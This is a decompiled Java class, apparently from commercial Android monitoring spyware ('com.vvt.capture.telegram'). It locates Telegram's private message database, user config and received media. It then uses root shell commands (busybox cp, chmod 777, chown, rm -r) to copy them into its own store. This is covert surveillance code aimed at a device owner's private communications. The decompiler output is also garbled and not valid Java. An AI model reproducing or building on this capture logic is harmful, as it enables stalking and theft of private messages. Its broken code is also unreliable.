package com.vvt.capture.telegram;

import com.vvt.capture.telegram.internal.TLRPC.Audio;
import com.vvt.capture.telegram.internal.TLRPC.Document;
import com.vvt.capture.telegram.internal.TLRPC.DocumentAttribute;
import com.vvt.capture.telegram.internal.TLRPC.FileLocation;
import com.vvt.capture.telegram.internal.TLRPC.MessageMedia;
import com.vvt.capture.telegram.internal.TLRPC.Photo;
import com.vvt.capture.telegram.internal.TLRPC.PhotoSize;
import com.vvt.capture.telegram.internal.TLRPC.TL_documentAttributeAnimated;
import com.vvt.capture.telegram.internal.TLRPC.TL_documentAttributeAudio;
import com.vvt.capture.telegram.internal.TLRPC.Video;
import com.vvt.io.p;
import com.vvt.io.q;
import com.vvt.shell.KMShell;
import com.vvt.shell.KMShell.ShellException;
import com.vvt.shell.ShellUtil;
import java.io.File;
import java.io.Serializable;
import java.util.ArrayList;
import java.util.Iterator;

public class d
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private static final String c = d.class.getSimpleName();
  private static Boolean d = null;
  private static Boolean e = null;
  
  public static String a()
  {
    int i = 4;
    int j = 3;
    int k = 2;
    int m = 1;
    int n = 0;
    String str1 = null;
    boolean bool1 = false;
    String[] arrayOfString = new String[k];
    Object[] arrayOfObject = new Object[i];
    arrayOfObject[0] = "/data/data";
    arrayOfObject[m] = "org.telegram.messenger";
    arrayOfObject[k] = "files";
    arrayOfObject[j] = "cache4.db";
    String str2 = String.format("%s/%s/%s/%s", arrayOfObject);
    arrayOfString[0] = str2;
    arrayOfObject = new Object[i];
    arrayOfObject[0] = "/dbdata/databases";
    arrayOfObject[m] = "org.telegram.messenger";
    arrayOfObject[k] = "files";
    String str3 = "cache4.db";
    arrayOfObject[j] = str3;
    str2 = String.format("%s/%s/%s/%s", arrayOfObject);
    arrayOfString[m] = str2;
    int i1 = arrayOfString.length;
    int i2 = 0;
    str2 = null;
    if (i2 < i1)
    {
      str1 = arrayOfString[i2];
      boolean bool2 = ShellUtil.b(str1);
      if (bool2)
      {
        bool1 = a;
        if (!bool1) {}
      }
    }
    for (;;)
    {
      return str1;
      n = i2 + 1;
      i2 = n;
      break;
      n = 0;
      str1 = null;
    }
  }
  
  public static String a(TLRPC.FileLocation paramFileLocation, String paramString)
  {
    int i = 2;
    int j = 1;
    int k = 0;
    String str = null;
    boolean bool1 = false;
    int m = 3;
    String[] arrayOfString = new String[m];
    Object localObject1 = new Object[i];
    localObject1[0] = paramString;
    Object localObject2 = "telegramProfile";
    localObject1[j] = localObject2;
    Object localObject3 = String.format("%s/%s/", (Object[])localObject1);
    localObject1 = com.vvt.io.d.h(c.f);
    boolean bool2 = a;
    if (bool2) {}
    localObject2 = new java/lang/StringBuilder;
    ((StringBuilder)localObject2).<init>((String)localObject1);
    long l1 = paramFileLocation.volume_id;
    localObject1 = ((StringBuilder)localObject2).append(l1).append("_");
    int n = paramFileLocation.local_id;
    localObject1 = ((StringBuilder)localObject1).append(n).append(".jpg");
    localObject2 = com.vvt.io.d.h("/sdcard/Telegram/");
    boolean bool4 = a;
    if (bool4) {}
    Object localObject4 = new java/lang/StringBuilder;
    ((StringBuilder)localObject4).<init>((String)localObject2);
    localObject2 = ((StringBuilder)localObject4).append("Telegram Images/");
    l1 = paramFileLocation.volume_id;
    localObject2 = ((StringBuilder)localObject2).append(l1).append("_");
    int i1 = paramFileLocation.local_id;
    localObject2 = ((StringBuilder)localObject2).append(i1).append(".jpg");
    localObject4 = new java/lang/StringBuilder;
    ((StringBuilder)localObject4).<init>((String)localObject3);
    long l2 = paramFileLocation.volume_id;
    localObject3 = ((StringBuilder)localObject4).append(l2).append("_");
    i1 = paramFileLocation.local_id;
    localObject3 = ((StringBuilder)localObject3).append(i1);
    localObject4 = ".jpg";
    localObject3 = (String)localObject4;
    arrayOfString[0] = localObject3;
    localObject3 = ((StringBuilder)localObject2).toString();
    arrayOfString[j] = localObject3;
    localObject3 = ((StringBuilder)localObject1).toString();
    arrayOfString[i] = localObject3;
    int i2 = arrayOfString.length;
    m = 0;
    localObject3 = null;
    if (m < i2)
    {
      str = arrayOfString[m];
      boolean bool3 = ShellUtil.b(str);
      if (bool3)
      {
        bool1 = a;
        if (!bool1) {}
      }
    }
    for (;;)
    {
      return str;
      k = m + 1;
      m = k;
      break;
      k = 0;
      str = null;
    }
  }
  
  public static String a(TLRPC.MessageMedia paramMessageMedia)
  {
    Object localObject1 = "/sdcard/Telegram/";
    String str = com.vvt.io.d.h((String)localObject1);
    boolean bool1 = a;
    if (bool1) {}
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>(str);
    localObject1 = paramMessageMedia.video;
    int k;
    long l1;
    if (localObject1 != null)
    {
      localObject1 = localStringBuilder.append("Telegram Video/");
      k = paramMessageMedia.video.dc_id;
      localObject1 = ((StringBuilder)localObject1).append(k).append("_");
      l1 = paramMessageMedia.video.id;
      localObject1 = ((StringBuilder)localObject1).append(l1);
      localObject2 = ".mp4";
      ((StringBuilder)localObject1).append((String)localObject2);
    }
    label112:
    Object localObject3;
    for (;;)
    {
      localObject1 = localStringBuilder.toString();
      bool1 = ((String)localObject1).equals(str);
      if (!bool1) {
        break label610;
      }
      bool1 = false;
      localObject1 = null;
      return (String)localObject1;
      localObject1 = paramMessageMedia.audio;
      if (localObject1 != null)
      {
        localObject1 = localStringBuilder.append("Telegram Audio/");
        k = paramMessageMedia.audio.dc_id;
        localObject1 = ((StringBuilder)localObject1).append(k).append("_");
        l1 = paramMessageMedia.audio.id;
        localObject1 = ((StringBuilder)localObject1).append(l1);
        localObject2 = ".ogg";
        ((StringBuilder)localObject1).append((String)localObject2);
      }
      else
      {
        localObject1 = paramMessageMedia.photo;
        if (localObject1 != null)
        {
          localObject1 = paramMessageMedia.photo.sizes;
          k = paramMessageMedia.photo.sizes.size() + -1;
          localObject1 = (TLRPC.PhotoSize)((ArrayList)localObject1).get(k);
          l1 = ((TLRPC.PhotoSize)localObject1).location.volume_id;
          int i = ((TLRPC.PhotoSize)localObject1).location.local_id;
          localObject2 = localStringBuilder.append("Telegram Images/").append(l1);
          localObject3 = "_";
          localObject1 = ((StringBuilder)localObject2).append((String)localObject3).append(i);
          localObject2 = ".jpg";
          ((StringBuilder)localObject1).append((String)localObject2);
        }
        else
        {
          localObject1 = paramMessageMedia.document;
          if (localObject1 != null)
          {
            localObject1 = paramMessageMedia.document;
            boolean bool2 = b((TLRPC.Document)localObject1);
            if (bool2)
            {
              localObject1 = localStringBuilder.append("Telegram Video/");
              k = paramMessageMedia.document.dc_id;
              localObject1 = ((StringBuilder)localObject1).append(k).append("_");
              l1 = paramMessageMedia.document.id;
              localObject1 = ((StringBuilder)localObject1).append(l1);
              localObject2 = ".mp4";
              ((StringBuilder)localObject1).append((String)localObject2);
            }
            else
            {
              localObject1 = paramMessageMedia.document;
              bool2 = a((TLRPC.Document)localObject1);
              if (!bool2) {
                break;
              }
              localObject1 = localStringBuilder.append("Telegram Audio/");
              k = paramMessageMedia.document.dc_id;
              localObject1 = ((StringBuilder)localObject1).append(k).append("_");
              l1 = paramMessageMedia.document.id;
              localObject1 = ((StringBuilder)localObject1).append(l1);
              localObject2 = ".ogg";
              ((StringBuilder)localObject1).append((String)localObject2);
            }
          }
        }
      }
    }
    Object localObject2 = ".gif";
    localObject1 = paramMessageMedia.document.attributes;
    int j = ((ArrayList)localObject1).size();
    int n;
    if (j > 0)
    {
      localObject1 = paramMessageMedia.document.attributes;
      localObject3 = paramMessageMedia.document.attributes;
      n = ((ArrayList)localObject3).size() + -1;
    }
    for (localObject1 = ((TLRPC.DocumentAttribute)((ArrayList)localObject1).get(n)).file_name;; localObject1 = null)
    {
      int m;
      if (localObject1 != null)
      {
        localObject2 = ".";
        boolean bool3 = ((String)localObject1).contains((CharSequence)localObject2);
        if (bool3)
        {
          localObject2 = ".";
          m = ((String)localObject1).lastIndexOf((String)localObject2);
          localObject1 = ((String)localObject1).substring(m);
        }
      }
      for (;;)
      {
        m = paramMessageMedia.document.dc_id;
        l1 = m;
        long l2 = paramMessageMedia.document.id;
        localObject2 = localStringBuilder.append("Telegram Documents/").append(l1);
        localObject3 = "_";
        localObject2 = ((StringBuilder)localObject2).append((String)localObject3).append(l2);
        ((StringBuilder)localObject2).append((String)localObject1);
        break;
        localObject1 = "";
        continue;
        label610:
        localObject1 = localStringBuilder.toString();
        break label112;
        localObject1 = localObject2;
      }
      j = 0;
    }
  }
  
  public static String a(String paramString1, String paramString2, String paramString3)
  {
    String str1 = null;
    bool = ShellUtil.b(paramString1);
    if (bool) {}
    for (;;)
    {
      try
      {
        Object localObject1 = new java/io/File;
        ((File)localObject1).<init>(paramString1);
        localObject1 = ((File)localObject1).getName();
        Object localObject2 = c(paramString2);
        str1 = p.a((String)localObject2, (String)localObject1);
        localObject1 = "mkdir %s; chmod 777 %s; chown %s.%s %s";
        int i = 5;
        Object[] arrayOfObject = new Object[i];
        int j = 0;
        String str2 = null;
        arrayOfObject[0] = localObject2;
        j = 1;
        arrayOfObject[j] = localObject2;
        j = 2;
        arrayOfObject[j] = paramString3;
        j = 3;
        arrayOfObject[j] = paramString3;
        j = 4;
        arrayOfObject[j] = localObject2;
        localObject1 = String.format((String)localObject1, arrayOfObject);
        KMShell.a((String)localObject1);
        bool = com.vvt.aa.a.c();
        if (bool) {
          ShellUtil.k((String)localObject2);
        }
        localObject1 = "%s cp %s %s; chmod 755 %s; chown %s.%s %s";
        int k = 7;
        localObject2 = new Object[k];
        i = 0;
        arrayOfObject = null;
        str2 = b(paramString2);
        localObject2[0] = str2;
        i = 1;
        localObject2[i] = paramString1;
        i = 2;
        localObject2[i] = str1;
        i = 3;
        localObject2[i] = str1;
        i = 4;
        localObject2[i] = paramString3;
        i = 5;
        localObject2[i] = paramString3;
        i = 6;
        localObject2[i] = str1;
        localObject1 = String.format((String)localObject1, (Object[])localObject2);
        KMShell.a((String)localObject1);
        bool = com.vvt.aa.a.c();
        if (bool) {
          ShellUtil.k(str1);
        }
        bool = a;
        if (!bool) {}
      }
      catch (Exception localException)
      {
        bool = b;
        if (!bool) {
          continue;
        }
        continue;
      }
      return str1;
      bool = a;
      if (!bool) {}
    }
  }
  
  public static void a(Boolean paramBoolean, String paramString, boolean paramBoolean1)
  {
    boolean bool1 = true;
    Object localObject1 = e;
    Object localObject2;
    boolean bool2;
    if (localObject1 == null)
    {
      localObject1 = "%s/%s";
      int i = 2;
      localObject2 = new Object[i];
      localObject2[0] = paramString;
      String str = "telegram_db_open_status";
      localObject2[bool1] = str;
      localObject2 = String.format((String)localObject1, (Object[])localObject2);
      bool2 = paramBoolean.booleanValue();
      if (!bool2) {
        break label111;
      }
    }
    label111:
    for (localObject1 = "1";; localObject1 = "0")
    {
      q.a((Serializable)localObject1, (String)localObject2);
      bool2 = a;
      if (bool2) {}
      if (paramBoolean1)
      {
        bool2 = a;
        if (bool2) {}
        localObject1 = Boolean.valueOf(bool1);
        e = (Boolean)localObject1;
      }
      return;
    }
  }
  
  private static boolean a(TLRPC.Document paramDocument)
  {
    Object localObject1;
    boolean bool;
    if (paramDocument != null)
    {
      localObject1 = paramDocument.mime_type;
      if (localObject1 != null)
      {
        localObject1 = paramDocument.mime_type;
        Object localObject2 = "audio/ogg";
        bool = ((String)localObject1).equals(localObject2);
        if (bool)
        {
          localObject1 = paramDocument.attributes;
          localObject2 = ((ArrayList)localObject1).iterator();
          do
          {
            bool = ((Iterator)localObject2).hasNext();
            if (!bool) {
              break;
            }
            localObject1 = (TLRPC.DocumentAttribute)((Iterator)localObject2).next();
            bool = localObject1 instanceof TLRPC.TL_documentAttributeAudio;
          } while (!bool);
          bool = true;
        }
      }
    }
    for (;;)
    {
      return bool;
      bool = false;
      localObject1 = null;
    }
  }
  
  public static boolean a(String paramString)
  {
    d = e(paramString);
    Boolean localBoolean = d;
    if (localBoolean == null)
    {
      a(Boolean.valueOf(false), paramString, false);
      localBoolean = Boolean.valueOf(true);
      d = localBoolean;
      boolean bool = a;
      if (!bool) {}
    }
    return d.booleanValue();
  }
  
  public static String b()
  {
    int i = 4;
    int j = 3;
    int k = 2;
    int m = 1;
    int n = 0;
    String str1 = null;
    boolean bool1 = false;
    String[] arrayOfString = new String[k];
    Object[] arrayOfObject = new Object[i];
    arrayOfObject[0] = "/data/data";
    arrayOfObject[m] = "org.telegram.messenger";
    arrayOfObject[k] = "shared_prefs";
    arrayOfObject[j] = "userconfing.xml";
    String str2 = String.format("%s/%s/%s/%s", arrayOfObject);
    arrayOfString[0] = str2;
    arrayOfObject = new Object[i];
    arrayOfObject[0] = "/dbdata/databases";
    arrayOfObject[m] = "org.telegram.messenger";
    arrayOfObject[k] = "shared_prefs";
    String str3 = "userconfing.xml";
    arrayOfObject[j] = str3;
    str2 = String.format("%s/%s/%s/%s", arrayOfObject);
    arrayOfString[m] = str2;
    int i1 = arrayOfString.length;
    int i2 = 0;
    str2 = null;
    if (i2 < i1)
    {
      str1 = arrayOfString[i2];
      boolean bool2 = ShellUtil.b(str1);
      if (bool2)
      {
        bool1 = a;
        if (!bool1) {}
      }
    }
    for (;;)
    {
      return str1;
      n = i2 + 1;
      i2 = n;
      break;
      n = 0;
      str1 = null;
    }
  }
  
  public static String b(String paramString)
  {
    return p.a(paramString, "busybox");
  }
  
  private static boolean b(TLRPC.Document paramDocument)
  {
    Object localObject;
    boolean bool;
    if (paramDocument != null)
    {
      localObject = paramDocument.thumb;
      if (localObject != null)
      {
        localObject = paramDocument.mime_type;
        if (localObject != null)
        {
          localObject = paramDocument.mime_type;
          String str = "video/mp4";
          bool = ((String)localObject).equals(str);
          if (bool)
          {
            bool = c(paramDocument);
            if (!bool) {
              bool = true;
            }
          }
        }
      }
    }
    for (;;)
    {
      return bool;
      bool = false;
      localObject = null;
    }
  }
  
  public static String c(String paramString)
  {
    return p.a(paramString, "telegram");
  }
  
  private static boolean c(TLRPC.Document paramDocument)
  {
    boolean bool1 = false;
    Object localObject;
    int i;
    if (paramDocument != null)
    {
      String str = paramDocument.mime_type;
      if (str != null)
      {
        str = paramDocument.mime_type;
        localObject = "video/mp4";
        i = str.equals(localObject);
        if (i != 0)
        {
          i = 0;
          str = null;
        }
      }
    }
    for (;;)
    {
      localObject = paramDocument.attributes;
      int k = ((ArrayList)localObject).size();
      if (i < k)
      {
        localObject = paramDocument.attributes.get(i);
        boolean bool2 = localObject instanceof TLRPC.TL_documentAttributeAnimated;
        if (bool2) {
          bool1 = true;
        }
      }
      else
      {
        return bool1;
      }
      int j;
      i += 1;
    }
  }
  
  public static void d(String paramString)
  {
    String str1 = c(paramString);
    String str2 = "rm -r %s";
    int i = 1;
    try
    {
      Object[] arrayOfObject = new Object[i];
      arrayOfObject[0] = str1;
      str1 = String.format(str2, arrayOfObject);
      KMShell.a(str1);
      return;
    }
    catch (KMShell.ShellException localShellException)
    {
      for (;;)
      {
        boolean bool = b;
        if (!bool) {}
      }
    }
  }
  
  private static Boolean e(String paramString)
  {
    boolean bool1 = true;
    Object localObject1 = null;
    int i = 2;
    Object localObject2 = new Object[i];
    localObject2[0] = paramString;
    String str = "telegram_db_open_status";
    localObject2[bool1] = str;
    Object localObject3 = q.a(String.format("%s/%s", (Object[])localObject2));
    if (localObject3 == null) {}
    int j;
    do
    {
      return (Boolean)localObject1;
      if (localObject3 == null) {
        break;
      }
      boolean bool2 = localObject3 instanceof String;
      if (!bool2) {
        break;
      }
      localObject3 = (String)localObject3;
      localObject2 = ((String)localObject3).trim();
      j = ((String)localObject2).length();
    } while (j == 0);
    for (;;)
    {
      localObject1 = "1";
      boolean bool3 = ((String)localObject3).equals(localObject1);
      if (bool3) {
        bool3 = bool1;
      }
      for (;;)
      {
        localObject1 = Boolean.valueOf(bool3);
        break;
        bool3 = false;
        localObject3 = null;
      }
      bool3 = false;
      localObject3 = null;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */